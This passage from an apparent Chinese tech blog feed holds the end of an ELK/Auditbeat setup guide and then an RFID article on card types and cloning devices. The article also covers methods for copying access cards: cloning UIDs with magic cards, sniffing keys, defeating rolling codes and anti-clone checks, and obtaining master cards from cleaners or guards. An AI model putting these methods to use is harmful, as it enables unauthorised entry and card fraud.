class="string">system</span></span><br><span class="line">  <span class="attr">datasets:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">package</span> <span class="comment"># Installed, updated, and removed packages</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">period:</span> <span class="string">2m</span> <span class="comment"># The frequency at which the datasets check for changes</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">-</span> <span class="attr">module:</span> <span class="string">system</span></span><br><span class="line">  <span class="attr">datasets:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">host</span>    <span class="comment"># General host information, e.g. uptime, IPs</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">login</span>   <span class="comment"># User logins, logouts, and system boots.</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">process</span> <span class="comment"># Started and stopped processes</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">socket</span>  <span class="comment"># Opened and closed sockets</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">user</span>    <span class="comment"># User information</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="attr">state.period:</span> <span class="string">12h</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="attr">user.detect_password_changes:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="attr">login.wtmp_file_pattern:</span> <span class="string">/var/log/wtmp*</span></span><br><span class="line">  <span class="attr">login.btmp_file_pattern:</span> <span class="string">/var/log/btmp*</span></span><br><span class="line"></span><br><span class="line"><span class="attr">setup.template.settings:</span></span><br><span class="line">  <span class="attr">index.number_of_shards:</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attr">setup.kibana:</span></span><br><span class="line">   <span class="attr">host:</span> <span class="string">"ip:port"</span></span><br><span class="line"></span><br><span class="line"><span class="attr">output.elasticsearch:</span></span><br><span class="line">  <span class="attr">hosts:</span> [<span class="string">"ip:port"</span>]</span><br><span class="line"></span><br><span class="line">  <span class="attr">username:</span> <span class="string">"elastic"</span></span><br><span class="line">  <span class="attr">password:</span> <span class="string">"密码"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attr">processors:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">add_host_metadata:</span> <span class="string">~</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">add_cloud_metadata:</span> <span class="string">~</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">add_docker_metadata:</span> <span class="string">~</span></span><br></pre></td></tr></tbody></table></figure><h2 id="安全方面设置"><a href="#安全方面设置" class="headerlink" title="安全方面设置"></a>安全方面设置</h2><p>参考：</p><p><a href="http://www.eryajf.net/3500.html">http://www.eryajf.net/3500.html</a></p><p><a href="https://blog.csdn.net/qq_27639777/article/details/98470844">https://blog.csdn.net/qq_27639777/article/details/98470844</a></p><h2 id="kibana面板设置"><a href="#kibana面板设置" class="headerlink" title="kibana面板设置"></a>kibana面板设置</h2><p>可以参考官方教程和网上教程</p><p>索引创建：</p><p><a href="https://www.elastic.co/guide/cn/kibana/current/tutorial-define-index.html">https://www.elastic.co/guide/cn/kibana/current/tutorial-define-index.html</a></p><p><strong>第一步</strong></p><p><img src="/2022/06/09/ELK%E5%9F%BA%E7%A1%80%E6%90%AD%E5%BB%BA/3ae7427fc9ec31dea53d29f87cfbec95.png"></p><p><strong>第二步</strong></p><p><img src="/2022/06/09/ELK%E5%9F%BA%E7%A1%80%E6%90%AD%E5%BB%BA/aa984b98ec6737d406abd9e47e71e5d0.png"></p><p><strong>第三步</strong></p><p><img src="/2022/06/09/ELK%E5%9F%BA%E7%A1%80%E6%90%AD%E5%BB%BA/81a25d50be53fe829da0838e574ae18f.png"></p><p>根据自己创建的索引进行筛选</p><p><img src="/2022/06/09/ELK%E5%9F%BA%E7%A1%80%E6%90%AD%E5%BB%BA/ff70f1025d3acf5f752320e6665c42f7.png"></p><p>创建用户，进行用户权限管控</p><p><a href="https://blog.csdn.net/cui884658/article/details/106805325">https://blog.csdn.net/cui884658/article/details/106805325</a></p><p>之前密文设置kibana后就多了个安全选项，可以进行权限管控，比如创建个只读用户</p><p><img src="/2022/06/09/ELK%E5%9F%BA%E7%A1%80%E6%90%AD%E5%BB%BA/1f660d5dde797d212150e99190c65411.png"></p>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Liunx </tag>
            
            <tag> ELK </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RFID卡片、破解及设备</title>
      <link href="/2022/04/25/RFID%E5%8D%A1%E7%89%87%E3%80%81%E7%A0%B4%E8%A7%A3%E5%8F%8A%E8%AE%BE%E5%A4%87/"/>
      <url>/2022/04/25/RFID%E5%8D%A1%E7%89%87%E3%80%81%E7%A0%B4%E8%A7%A3%E5%8F%8A%E8%AE%BE%E5%A4%87/</url>
      
        <content type="html"><![CDATA[<h1 id="RFID卡片、破解及设备"><a href="#RFID卡片、破解及设备" class="headerlink" title="RFID卡片、破解及设备"></a>RFID卡片、破解及设备</h1><h2 id="射频识别技术"><a href="#射频识别技术" class="headerlink" title="射频识别技术"></a>射频识别技术</h2><p>百度百科：</p><ul><li><p>射频识别（RFID）是 Radio Frequency Identification 的缩写。<br>其原理为阅读器与标签之间进行非接触式的数据通信，达到识别目标的目的。RFID 的应用非常广泛，典型应用有动物晶片、汽车晶片防盗器、门禁管制、停车场管制、生产线自动化、物料管理。</p></li><li><p>无线射频识别技术通过无线电波不接触快速信息交换和存储技术，通过无线通信结合数据访问技术，然后连接数据库系统，加以实现非接触式的双向通信，从而达到了识别的目的，用于数据交换，串联起一个极其复杂的系统。在识别系统中，通过电磁波实现电子标签的读写与通信。根据通信距离，可分为近场和远场，为此读/写设备和电子标签之间的数据交换方式也对应地被分为负载调制和反向散射调制。</p></li></ul><h2 id="RFID卡的区别"><a href="#RFID卡的区别" class="headerlink" title="RFID卡的区别"></a>RFID卡的区别</h2><p><img src="/2022/04/25/RFID%E5%8D%A1%E7%89%87%E3%80%81%E7%A0%B4%E8%A7%A3%E5%8F%8A%E8%AE%BE%E5%A4%87/389b47c1df5c2d9524db021c4cb1354f.png"></p><h3 id="低频"><a href="#低频" class="headerlink" title="低频"></a>低频</h3><h4 id="ID卡"><a href="#ID卡" class="headerlink" title="ID卡"></a>ID卡</h4><p>ID卡是我们的俗称，内部芯片的全名叫做EM4100或EM41XX ，频率是125kHz。每张卡出厂就有独一无二的ID号，不可改写。没有任何加密，只要知道卡号就可以模拟。ID卡可以作为一般的门禁或停车场系统的使用者身份识别，因ID卡无密钥安全认证机制，且不能写卡，很难实现一卡通功能，同时也不合适做消费系统。<br>特殊的还有250K、375K、500K频率的ID卡，原版proxmark3不支持这种卡的读写，祖国魔改版有些支持。</p><h4 id="T5577卡"><a href="#T5577卡" class="headerlink" title="T5577卡"></a>T5577卡</h4><p>T5577 卡是一种可以写入数据可以加密的低频卡。最特别之处是，写入ID号可以变身成为ID卡，写入HID号可以变身HID卡，写入Indala卡号，可以变身Indala卡。</p><p>T5577一共有8个块，每个块只能存8位数。第0块是用来设置卡片类型和调制方式的，决定了卡片是ID卡还是HID卡，如果随意修改会导致读不到卡。最后一个块，在没有加密时是数据区，加密后，其数据就变成了密码。</p><p>国内这卡主要是用来模拟ID卡用的。</p><h3 id="高频-14443A"><a href="#高频-14443A" class="headerlink" title="高频 -14443A"></a>高频 -14443A</h3><h3 id="IC卡"><a href="#IC卡" class="headerlink" title="IC卡"></a>IC卡</h3><p>IC卡又称集成电路卡，通常是在塑料卡片内嵌入一个或多个集成电路构成的PVC卡。集成电路芯片可以是存储器或微处理器。带有存储器的IC卡又称为记忆卡或存储卡，带有微处理器的IC卡又称为智能卡或智慧卡。记忆卡可以存储大量信息；智能卡则不仅具有记忆能力，而且还具有处理信息的功能。IC卡可以十分方便地存汽车费、电话费、地铁乘车费、食堂就餐费、公路付费以及购物旅游、贸易服务等。  </p><h4 id="M1-S50卡"><a href="#M1-S50卡" class="headerlink" title="M1 S50卡"></a>M1 S50卡</h4><p>目前最常见的高频卡，也是我们口中俗称的IC卡。M1卡科储存的数据大小为8k，分为16个扇区，每个扇区分4个块，每个块为16个字节，以块为存取单位。每个扇区都有独立的一组密码及访问控制，每张卡有唯一的一个32位的序列号。每个扇区的0,1,2块为数据块，用来存储数据，第3块为控制块，包括了密A、存取控制、密码B 每张卡的第0扇区的第0块用来春芳厂商代码，不可更改。<br><img src="/2022/04/25/RFID%E5%8D%A1%E7%89%87%E3%80%81%E7%A0%B4%E8%A7%A3%E5%8F%8A%E8%AE%BE%E5%A4%87/aab8017394ff097e1d19174b0827e2ca.png"><br>中间4字节控制字是管理密码权限，用来设置A密码和B密码的功能。默认不修改的时候，可以用A密码读写所有数据。A密码不可读出，B密码可以用A密码读出。密码不一定可以读取，由控制字决定。</p><p>这个卡又分 非加密卡 、半加密卡 和 全加密卡。</p><p>非加密卡中所有扇区的KEYA和KEYB数值都是默认值FFFFFFFFFFFF。</p><p>而加密卡中，其中有扇区的KEYA和KEYB不等于FFFFFFFFFFFF，部分扇区加密的卡称半加密卡，所有扇区都加密的卡称全加密卡。</p><h4 id="M1-UID卡"><a href="#M1-UID卡" class="headerlink" title="M1 UID卡"></a>M1 UID卡</h4><p>全称l Mifare UID Chinese magic card（中国魔术卡），简称UID卡。</p><p>M1 UID卡是针对M1 S50卡特制的变种卡，用起来和M1 S50完全一样，只是多了一个功能，就是0扇区块的数据可以随意修改。因此UID号也可以随意修改，厂家信息也可以随意修改。UID卡修改0扇区0块数据是靠指令进入工厂模式，可以直接对全卡任何数据编辑，不需要密码即可读写卡，同时不怕写坏卡，即使写错0块，写坏扇区控制字，也可以随时修复回来，不影响后续使用。</p><h4 id="CUID卡"><a href="#CUID卡" class="headerlink" title="CUID卡"></a>CUID卡</h4><p>CUID卡是针对UID卡做的优化。CUID卡可以重复修改0块，但是它和UID卡的区别是，UID卡是通过指令修改0块，CUID使用的是常规密码验证的方法写0块（写错了之后重写需要清卡），其他扇区和标准M1卡相同。缺点是，还是有可能会被检测出来，而且如果不小心写错了UID号的校验位导致无法读卡，没办法修复只能报废。</p><h4 id="FUID卡"><a href="#FUID卡" class="headerlink" title="FUID卡"></a>FUID卡</h4><p>FUID卡是针对UID卡做的优化。新的读卡系统，通过检测卡片对特殊指令的回应，可以检测出UID卡，因此可以来拒绝UID卡的访问，来达到屏蔽复制卡的功能。FUID可以修改0块，但只可以修改一次，写错也没办法更改，也不能重复利用。修改后和M1卡完全一样，很难被屏蔽检测。</p><h4 id="CFUID卡"><a href="#CFUID卡" class="headerlink" title="CFUID卡"></a>CFUID卡</h4><p>鉴于FUID卡写错的成本太高，又发展出了这种卡。 CFUID卡 0扇区固化前可随意修改（相当于UID卡），固化（锁卡）后就跟M1卡完全一样。</p><h4 id="侦测卡："><a href="#侦测卡：" class="headerlink" title="侦测卡："></a>侦测卡：</h4><p>可用122等设备写入id号然后用来读取并记录设备发出的密码信息，用于侦测密码，但其功能鸡肋，前有pm3离线侦测，后有变色龙模拟加侦测，现在基本淘汰。</p><h4 id="EMV卡"><a href="#EMV卡" class="headerlink" title="EMV卡"></a>EMV卡</h4><p>EMV规范是由Europay、Mastercard、Visa三大信用卡国际组织联合制定的IC（智能）卡金融支付应用标准，非接触传输协议方面也是遵循的14443A标注，是一种CPU芯片卡。</p><p>目前基于EMV卡的非接触式支付的实现有三个：VISA的payWave，MasterCard的PayPass以及银联的闪付QuickPass。目前从外观来看，银联发行的卡面有芯片的IC卡均支持闪付，部分银行支持VISA的payWave。</p><h3 id="高频-14443B"><a href="#高频-14443B" class="headerlink" title="高频 -14443B"></a>高频 -14443B</h3><p>跟ISO 14443 -Type A 标准 的不同主要在于载波的调制深度及位的编码方式。TYPE A采用开关键控(On-Off keying)的Manchester编码，TYPE B采用NRZ-L的BPSK编码。</p><p>TYPE B与TYPE A相比，具有传输能量不中断、速率更高、抗干扰能力强的优点。RFID的核心是防冲突技术，这也是和接触式IC卡的主要区别。ISO14443-3规定了TYPEA和TYPE B的防冲突机制。二者防冲突机制的原理不同，前者是基于位冲突检测协议，而TYPE B通信系列命令序列完成防冲突。</p><p>目前的二代身份证，社保卡，护照都是基于此标准，研究这个标准最初是为了能读出身份证信息或者护照，其中曲折下一篇文章再说。</p><p>Proxmark3的14b部分有对 ST Microelectronics 公司的 SRI512卡 和SRIX4K卡 的特别支持。</p><h3 id="NFC标签"><a href="#NFC标签" class="headerlink" title="NFC标签"></a>NFC标签</h3><p>目前有五种，分别基于14a, 14b，Felica ，ISO/IEC 15693 标准, 详见上面脑图。</p><h3 id="CPU卡"><a href="#CPU卡" class="headerlink" title="CPU卡"></a>CPU卡</h3><p>CPU卡芯片是一个微处理器，它的功能相当于一台微型计算机。CPU卡可适用于金融、保险、交警、政府行业等多个领域，CPU卡的优点是存储空间大、读取速度快、支持一卡多用功能等特点，CPU卡从外型上与普通IC卡，射频卡并没有太大差异，但是性能上却有巨大提升，安全性和普通IC卡比，提高很多，通常CPU卡内含有随机数发生器，硬件DES,3DES加密算法等，配合CPU卡芯片上的COS操作系统,可以达到金融级的安全级别。</p><p>CPU卡在三个方面保证了安全：</p><ol><li><p>对人：持卡者合法性认证：持卡者需要输入口令。</p></li><li><p>对卡：卡的合法性认证；内部认证。</p></li><li><p>对系统：系统的合法性认证；外部认证。</p></li></ol><h4 id="SAM卡简介"><a href="#SAM卡简介" class="headerlink" title="SAM卡简介"></a>SAM卡简介</h4><p>SAM卡：全称是Security Access module；是一种特殊的CPU卡；存储了密钥和加解密算法。</p><p>目前SAM卡分了很多种：</p><p>PSAM卡：终端安全控制模块，一般用于小额支付扣款中；</p><p>ESAM：厂商（系统）的SAM卡，用于设备的认证；</p><p>ISAM：用于充值；</p><p>在具体的实现中，会比较多样化。例如，有的设备认证并不是用ESAM卡，而是采用专用的模块。这样，就存在一个问题，即密钥用软件实现，可能会存在密钥泄露的问题；一种解决的方法是存储多组密钥，在随机数中指定采用一组密钥。</p><p>普通卡的发行一般采用密钥对唯一的物理卡号加密的方式。</p><h2 id="高频卡-低频卡区分方法"><a href="#高频卡-低频卡区分方法" class="headerlink" title="高频卡 低频卡区分方法"></a>高频卡 低频卡区分方法</h2><p><img src="/2022/04/25/RFID%E5%8D%A1%E7%89%87%E3%80%81%E7%A0%B4%E8%A7%A3%E5%8F%8A%E8%AE%BE%E5%A4%87/73bcb9dc5c1f553cb723a2b31110870e.png"><br><img src="/2022/04/25/RFID%E5%8D%A1%E7%89%87%E3%80%81%E7%A0%B4%E8%A7%A3%E5%8F%8A%E8%AE%BE%E5%A4%87/92b0ca435f0729c524dbfe11ff189cf2.png"></p><h2 id="门禁卡破解思路"><a href="#门禁卡破解思路" class="headerlink" title="门禁卡破解思路"></a>门禁卡破解思路</h2><p>ID卡使用手持机或者proxmark3等设备直接读出卡号即可模拟，最是无脑，CPU卡建议直接放弃。</p><p>所以这里的门禁卡单指Mafira系列。</p><h2 id="IC卡加密方式"><a href="#IC卡加密方式" class="headerlink" title="IC卡加密方式"></a>IC卡加密方式</h2><p>要知道怎么破解，先要知道他们是怎么加密。</p><p>目前常见的加密方式有这几种：</p><p><img src="/2022/04/25/RFID%E5%8D%A1%E7%89%87%E3%80%81%E7%A0%B4%E8%A7%A3%E5%8F%8A%E8%AE%BE%E5%A4%87/a61b5c8e46c74da7c50efd0b515fe5f2.png"></p><h3 id="1-固定加密（校验码）："><a href="#1-固定加密（校验码）：" class="headerlink" title="1.固定加密（校验码）："></a>1.固定加密（校验码）：</h3><p>彼时来自东方的神秘技术 ：中国魔术卡 尚未降世，就算复制出来原卡数据，每张IC的ID也是不一样的，厂家只需要校验UID跟校验位匹配不匹配就可以防复制卡了。</p><p>这种只需要UID卡复制其UID以及校验位即可完美破解。</p><h3 id="2-一卡一密："><a href="#2-一卡一密：" class="headerlink" title="2.一卡一密："></a>2.一卡一密：</h3><p>这种加密方式只是把校验码，改成了密码。刷卡机读卡是根据卡号算出这张卡独一无二的密码，然后再用密码访问/修改金额 。</p><p>运用UID卡复制，也可简单解决。</p><h3 id="3-全加密："><a href="#3-全加密：" class="headerlink" title="3.全加密："></a>3.全加密：</h3><p>即IC卡16扇区均加入密码，一般是一个卡商用同一密码，密码破解可通过 侦测卡或pm3离线侦测，密码已知后，写入普通卡或UID卡，即可实现复制。</p><p>后来又出现了一种 一卡一密+ 全加密的卡，不过在PM3及UID卡面前不过是土鸡瓦狗而已。</p><h3 id="4-动态码加密："><a href="#4-动态码加密：" class="headerlink" title="4.动态码加密："></a>4.动态码加密：</h3><p>每次刷卡后，卡内数据都会变化。</p><p>这种比较麻烦，可以分几种情况：</p><ol><li>有些系统比较简单，每次刷新后某个数据加一，或者加固定数字，这种很容易发现规律和破解。</li><li>有些卡数据刷新后没有什么规律，明显用了某种算法，这种有能力的可以多刷几次，尝试逆向算法，不过难度比较大，</li><li>通过更改控制位或者修改卡内某些地方的数据来压制卡内数据的滚动，这是利用了早期某些厂家的读头不会校验计算后的数据是否写入成功的漏洞。<br>4.一些系统识别到卡里数据是从未滚动过的初始值后，就不会再做任何校验，认为这是张新卡。这种只要记录下初始数据，复制卡每次刷卡后 重置数据即可。 (刚了解到还有一种GTU卡（gtu、guid、gid、gpu，处女卡）, 可以锁定滚动码，让读卡器写卡失败卡)</li><li>一些系统识别到卡里数据是初始值后，还会进行校验，这时候我们可以使用同厂家同型号同版本的发卡器，通过修改发卡器发卡规则使得规则与物业的发卡规则相同来发卡。但是破解发卡规则同样很难，同时梯控厂家也不会向个人单独销售配套发卡器。</li><li>社工大法：通过保洁阿姨、保安大哥或者特别的技法获取 全通卡，就是给内部员工用的“万能钥匙”，这种卡一般不做加密，搞到之后复制一张基本就OK了。</li></ol><p>注意事项：复制卡不确定是否是滚动码时， 复制后第一次刷卡原则上请刷原卡，不然数据滚动之后，原卡可能作废 。 卡与原卡仅一张有效</p><h3 id="5-防复制加密："><a href="#5-防复制加密：" class="headerlink" title="5.防复制加密："></a>5.防复制加密：</h3><p>用UID卡复制成功以后去现场刷卡没任何反应 或 就可以使用一次以后就给设备破环了拷贝卡的问题。</p><p>也存在几种情况，目前最常用的：</p><ol><li>校验magic指令，UID卡会响应magic指令，所以防火墙只要发现有magic指令的响应直接ban掉改卡，于是CUID卡应运而生。</li><li>防火墙尝试修改卡的0扇区，修改成功则说明是CUID卡，ban掉。 这种用FUID或者CFUID复制即可。</li></ol><h3 id="6-复合卡加密："><a href="#6-复合卡加密：" class="headerlink" title="6.复合卡加密："></a>6.复合卡加密：</h3><p>利用ID或IC设备复制成功以后就可以开启其中一个地方，其他地方不可以同时开启。一般是IC+ID的结构，需要同时复制高频低频两个芯片。</p><h3 id="7-CPU芯片加密："><a href="#7-CPU芯片加密：" class="headerlink" title="7.CPU芯片加密："></a>7.CPU芯片加密：</h3><p>这种分析数据时全是零， 可能目标卡是CPU卡模拟的M1卡 或是 修改了控制位的数据把卡号隐藏起来。 这种可以最多可以做到复制UID，模拟刷个门禁啥的，涉及金额的就别想了。</p><h2 id="一般流程"><a href="#一般流程" class="headerlink" title="一般流程"></a>一般流程</h2><p>流程图如下：<br><img src="/2022/04/25/RFID%E5%8D%A1%E7%89%87%E3%80%81%E7%A0%B4%E8%A7%A3%E5%8F%8A%E8%AE%BE%E5%A4%87/b3b9366cea4ee09394dd902c913b43a2.png"></p><h2 id="RFID设备"><a href="#RFID设备" class="headerlink" title="RFID设备"></a>RFID设备</h2><h3 id="Proxmark3"><a href="#Proxmark3" class="headerlink" title="Proxmark3"></a>Proxmark3</h3><p>价格：200-300元不等<br>优点：性能最好，解密能力强。<br>缺点：有一定使用门槛，价格稍贵。<br><strong>简介</strong><br>Proxmark3是由Jonathan Westhues为了他的硕士论文设计开发的开源硬件，其主要用途是实现RFID卡片 的嗅探、读取破解以及克隆等等操作。</p><p>提到RFID， 就不得不提Proxmark3，PM3 属于这个领域的大杀器，基本相当于kali之于安全，node之于前端。它可以嗅探、模拟以及读取多种不同种类型的RFID，同时它还有一个官方社区，这里有不少同样的爱好者在里面学习交流。</p><p>Proxmark，确切来说是prox（接近的），mark（标签），翻译过来的意思就是“不用接触，靠近就能刷的卡片”。</p><p><a href="https://github.com/Proxmark/proxmark3">https://github.com/Proxmark/proxmark3</a></p><h3 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h3><h4 id="Proxmark2"><a href="#Proxmark2" class="headerlink" title="Proxmark2"></a>Proxmark2</h4><p>Proxmark是没有1的 ，Proxmark3 前身是Proxmark2。</p><p>Proxmark2版本是因为Jonathan Wesrhues 为了复制Verichip才应运而生的。 而Proxmark2的前身就是一个便携式的Verichips，该硬件可以读取并且重放Verichip的ID，如果利用天线去靠近Verichip，那样子设备就可以永远的保留ID在芯片里面，实际上Jonathan Westhues只是采用逆向工程把Verichip的频率和调制模式进行捕抓，从而进行回放操作。</p><h4 id="Proxmark3-原版"><a href="#Proxmark3-原版" class="headerlink" title="Proxmark3 原版"></a>Proxmark3 原版</h4><p>原型机，长这样，开源硬件，电路板github有，已经过时了，不是商业产品，不卖。</p><p>其他版本都是基于此版的原理做的改板。</p><h4 id="Proxmark3-RDV2"><a href="#Proxmark3-RDV2" class="headerlink" title="Proxmark3 RDV2"></a>Proxmark3 RDV2</h4><p>这个版本算是Proxmark3第一次商业化的版本，研发团队是Elechouse（深圳一家硬件厂商） 。 RDV2 即是 Revision Two（重制版2 )。</p><p>Proxmark3 RDV2 修改和更新了Proxmark3所有主要的硬件组件，包括微控制器，FPGA和闪存。</p><p>但是，最重要的变化是天线的设计和实现。 Proxmark 3的笨重，笨拙和未调谐的天线已替换为紧凑的，预先调谐的HF和LF天线，使用标准的SMA接口代替以前使用的USB-Hirose电缆。</p><p>这个版本预装了可拆的低频和高频天线，也是首个“ALL-IN-ONE”的版本。但是天线性能存在已知问题，并且会被继电器故障影响。</p><p>有些论坛说的血贵的就是这个版本，之前貌似上千，现在五六百左右吧。</p><p><strong>技术规格</strong></p><ul><li>CPU AT91SAM7S512</li><li>Storage 512Kb SPI flash</li><li>Interface 4x mode LEDs, 1x button.</li><li>Battery 独立外接电源</li><li>天线<ul><li>LF 预装，可拆</li><li>HF 预装，可拆</li></ul></li></ul><p><img src="/2022/04/25/RFID%E5%8D%A1%E7%89%87%E3%80%81%E7%A0%B4%E8%A7%A3%E5%8F%8A%E8%AE%BE%E5%A4%87/81c864de6ee6209c4b324108423c4211.png"></p><h4 id="Proxmark3-EASY"><a href="#Proxmark3-EASY" class="headerlink" title="Proxmark3 EASY"></a>Proxmark3 EASY</h4><p>同样是 Elechouse团队的作品，是Proxmark3 RDV2 的阉割版，主要为了迎合中国市场在某宝卖的。</p><p>基本上某宝卖的都是基于这个版本或Proxmark3 RDV2 的魔改版。</p><p>比RDV2阉割了CPU、内存,还有外接电池。</p><p><strong>技术规格</strong></p><ul><li>CPU AT91SAM7S256</li><li>Storage 256Kb SPI flash</li><li>Interface 4x mode LEDs, 1x button.</li><li>天线<ul><li>LF 需自行组装</li><li>HF 一体，不可拆</li></ul></li></ul><h4 id="Proxmark-3-EVO"><a href="#Proxmark-3-EVO" class="headerlink" title="Proxmark 3 EVO"></a>Proxmark 3 EVO</h4><p>Proxmark 3 EVO(Evolution，进化版)，是Elechouse 开发的最后一个Proxmark 3版本，更加的小型化，用了ABS 的材质，加了点灯，适配了安卓平台。</p><p><strong>技术规格</strong></p><ul><li>CPU AT91SAM7S512</li><li>Storage External 2MBits / 512Kb SPI flash</li><li>Interface 1x RGB LED, 1x button.</li><li>电源 外接独立电池</li><li>天线<ul><li>LF 预装，一体</li><li>HF 预装，一体</li></ul></li></ul><h4 id="Proxmark3-RDV4"><a href="#Proxmark3-RDV4" class="headerlink" title="Proxmark3 RDV4"></a>Proxmark3 RDV4</h4><p>Proxmark3 RDV4是目前Proxmark3 平台 最新的版本，由 RRG团队开发，就是开官方论坛和固件很受欢迎的iceman 所在的团队 。 不过价格比较贵，基础版要一千五左右，所有外设买齐得好几千，需要海淘。</p><p><strong>版本特色</strong></p><ul><li>更小的体积 54 x 87 x 10mm （EVO是60 x 90 x 12mm）</li><li>支持了 SIM/Smart 卡的嗅探和读取</li><li>可扩展框架：<ul><li>可热插拔的中长距离天线</li><li>增加了 蓝牙 和 wifi 模式</li></ul></li></ul><p><strong>技术规格</strong></p><ul><li>CPU SAM7S512</li><li>Storage External 2MBits / 256Kb SPI flash</li><li>Interface 4x power LEDs, 4x mode LEDs, 1x button.</li><li>天线<ul><li>LF (125KHz): 70mm @ 65V</li><li>HF (13.56MHz): 88mm @ 44V</li></ul></li></ul><h4 id="Proxmark3-各种祖国版"><a href="#Proxmark3-各种祖国版" class="headerlink" title="Proxmark3 各种祖国版"></a>Proxmark3 各种祖国版</h4><p>商家鼓吹什么3.0、4.0、5.0，终极 版本，其实各种版本基本都是Proxmark3 RDV2 或者easy 魔改的，选购时关注下cpu版本和内存 线圈和做工即可。</p><p>不过有时候会看到各种颜色，颜色只是印刷电路板用的阻焊剂（阻焊漆）不一样，油墨颜色不一样，不会影响实际功能和质量。</p><p>常见的电路板颜色有绿色、红色、蓝色、黑色。详细信息可以自行百度。原来的pm3是黑色的，看上去高端一些。现在新出了蓝色的，没别的原因，就是为了降低成本。虽然不影响质量，但是绿色、红色、蓝色的油墨用得比较多，量大价格就低。</p><p>不要听一些商家瞎吹做了什么升级，保证元器件没有任何改动。商家鼓吹蓝色是升级款，只是为了掩盖他的真实原因是为了降低成本，外加一波营销。</p><h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><p>中文GUI主要是对43a的IC卡和 低频ID做的支持，对其他协议的卡片都没有支持。</p><p>熟悉基本操作之后，想要探索PM3的魅力还是推荐使用 命令行， 命令行教程汉化可以看RadioWar的wiki <a href="http://wiki.radiowar.org/Proxmark3%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C">RadioWar:Proxmark3</a>命令帮助，其他教程也非常的多，可以自行查找。</p><p>打开方法是进入软件安装目录：</p><figure class="highlight jboss-cli"><table><tbody><tr><td class="code"><pre><span class="line"><span class="string">./prommark3.exe</span>   com4   <span class="comment"># com号会变，根据自己实际情况调整</span></span><br></pre></td></tr></tbody></table></figure><h3 id="变色龙-Mini-ChameleonMini"><a href="#变色龙-Mini-ChameleonMini" class="headerlink" title="变色龙 Mini ,ChameleonMini"></a>变色龙 Mini ,ChameleonMini</h3><p>在网购PM3时，经常可以看到有PM3变色龙一体机卖，当时询问js ,他们也是语焉不详 。所以这里再单独介绍下变色龙是个啥。</p><p>变色龙 ChameleonMini 是一款可编程的 NFC 安全分析工具的开源硬件项目，可模拟各种ic卡、侦测密码，可同时储存六组卡片数据随时可以手动切换，体积跟普通卡差不多方便携带。</p><p>ChameleonMini 常见的有两个版本 ChameleonMini Rev.E 与 ChameleonMini Rev.G 其中 Rev.G 是最新升级的版本，自带电池供电。</p><p>说白了，变色龙就是一张先进的侦测卡，不具备读写功能，需要配合其他读写设备使用。 PM3的现场嗅探功能其实比较弱，集成了变色龙之后就补齐了这个短板。</p><h3 id="PN532"><a href="#PN532" class="headerlink" title="PN532"></a>PN532</h3><p>价格：40元上下（带TTL转USB）</p><p>优点：价格便宜，解密能力较好</p><p>缺点：速度较慢，需要自己连接TTL线，稳定性一般。</p><p>简单的说，就是协议支持的类型 PN 比RC系列更多。 PN支持NFC协议，RC主要是支持ISO14443A/B。</p><p>PN532支持的卡类型有限，甚至在曾经PN532并无很多好用的上位机程序，而多用于RFID开发中。这几年出现了M1T。是一款很好用的开源程序，支持了多种解密方式。但是限于硬件性能，解密速度上不如Proxmark3，但是在解密能力上在一般场景下不逊于Proxmark3。</p><p>M1T<br>M1T项目地址：<a href="https://github.com/xcicode/MifareOneTool">https://github.com/xcicode/MifareOneTool</a></p><h3 id="ACR122"><a href="#ACR122" class="headerlink" title="ACR122"></a>ACR122</h3><p>价格：100元上下</p><p>优点：开发包完善</p><p>缺点：解密速度，能解密的卡类型都比较少。</p><h3 id="iCopy3"><a href="#iCopy3" class="headerlink" title="iCopy3"></a>iCopy3</h3><p>优点：使用简单，解密类型比较多。</p><p>缺点：价格高到离谱，使用方式单一</p><p><img src="/2022/04/25/RFID%E5%8D%A1%E7%89%87%E3%80%81%E7%A0%B4%E8%A7%A3%E5%8F%8A%E8%AE%BE%E5%A4%87/741cba37aee8a1a2882ebebde7b6ba59.png"></p><p>这款设备主要是给锁匠用的，个人不建议购买。尤其是后期涉及到修改数据和数据分析时不如Proxmark3和PN532方便。</p><p>iCopy主要适合在室外时，不能携带电脑的操作场景。对于RFID爱好者来说，这样的场景应该不多吧。</p><p>对于解密能力，相信其还是不如Proxmark3的，毕竟单片机的计算能力有限，而且程序设计也不如电脑方便。</p><h3 id="RC-522"><a href="#RC-522" class="headerlink" title="RC-522"></a>RC-522</h3><p>价格：10元左右</p><p>优点：便宜</p><p>缺点：不支持写卡，只能阅读IC卡</p><p>大家需要注意⚠️</p><p>这是一款“读卡”设备，并不能写卡。因此需要修改数据和复制卡的还是不要看这一款设备了吧。</p><p>这款设备主要可以用于硬件开发，用在门禁上，电梯上这些只需要读取卡片的地方。</p><p>参考：<br><a href="https://baike.baidu.com/item/%E5%B0%84%E9%A2%91%E8%AF%86%E5%88%AB%E6%8A%80%E6%9C%AF/9524139">https://baike.baidu.com/item/%E5%B0%84%E9%A2%91%E8%AF%86%E5%88%AB%E6%8A%80%E6%9C%AF/9524139</a></p><p><a 